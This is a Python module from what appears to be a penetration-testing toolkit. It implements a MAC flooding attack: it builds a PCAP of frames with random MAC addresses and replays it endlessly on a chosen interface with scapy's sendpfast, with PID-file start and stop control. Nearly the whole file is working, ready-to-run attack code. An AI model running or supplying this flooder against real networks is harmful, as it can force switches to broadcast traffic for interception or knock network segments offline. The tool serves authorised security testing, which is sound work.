import six
from threading import Thread

from scapy.all import Ether
from scapy.all import IP
from scapy.all import sendpfast
from scapy.all import rdpcap
from scapy.all import wrpcap
from termcolor import colored

import ast
import os

from netpyntest_lib.libs import mactools

import signal
import sys
import random

def signal_handler(signal, frame):
    #print('Debug: MAC Flooding killed')
    control_file=open("control_file","r+")
    data=ast.literal_eval(control_file.read()) #parsing str to dict
    #Writing a 0 to say that it's not running anymore
    data['mac_flooding_pid'] = 0
    #Overwrite changes in file
    overWriteFile(control_file, str(data))
    sys.exit(0)
signal.signal(signal.SIGTERM, signal_handler)

def mac_flooding(file, interface):
    #TODO: LAUNCH THIS IN AN INDEPENDENT PROCESS TO ALLOW PARENT TO BE KILLED. Check "nohup" command

    #Read PCAP file. Can raise exception if file is not valid
    pkts = rdpcap(file)

    #Launch attack
    six.print_("[*] MAC Flooding attack STARTED")
    six.print_("[*] To stop the attack: ")
    six.print_("    If launched with '&' execute: 'sudo netpyntest.py mac_flooding stop'")
    six.print_("    If launched without '&' press Ctrl+C")

    while True:
        sendpfast(pkts, verbose=False, iface=interface)


def overWriteFile(file, data):
    """ Receives opened file (write mode) and overwrites the file
    with data
    :param file: file to write
    :type file: str
    :param data: data to write
    :type data: str
    """
    file.seek(0)
    file.write(data)
    file.truncate() #Deletes rest of the file
    file.close()


def start(file, interface):
    """ Launches a thread that executes mac_flooding
    :param file: PCAP file to be passed to mac_flooding
    :type file: str
    """
    #Access control file to  check if a MAC Flooding is running. Write PID in file if not.
    control_file = open("control_file", "r+")
    data=ast.literal_eval(control_file.read())
    if data['mac_flooding_pid'] == 0:
        data['mac_flooding_pid'] = os.getpid()
        overWriteFile(control_file, str(data))
    else:
        six.print_(colored("[!] ERROR - MAC Flooding is running", "red"))
        control_file.close()
        exit(0)
    mac_flooding(file, interface)

def stop():
    #Read data to locate process PID
    control_file=open("control_file","r+")
    data=ast.literal_eval(control_file.read()) #parsing str to dict
    pid = int(data['mac_flooding_pid'])

    #If 0, means it's not running
    if pid == 0:
        six.print_(colored("[!] ERROR - No MAC Flooding running", "red"))
        control_file.close()
        exit(0)
    else: #Kill process
        os.kill(pid, signal.SIGTERM)
        six.print_("[*] MAC Flooding Stopped")

    #Writing a 0 to say that it's not running anymore
    data['mac_flooding_pid'] = 0

    #Overwrite changes in file
    overWriteFile(control_file, str(data))


def generate_pcap(size):
    """ This function generates a PCAP file with frames containing
    random MAC addresses
    :param size: Number of frames to generate
    :type size: int
    """
    packets = []
    for i in range(0, size):
        pkt = Ether(
                dst=mactools.getRandomMAC(),
                src=mactools.getRandomMAC()
        ) / IP(

        )
        packets.append(pkt)

    wrpcap("mac_flooding.pcap", packets)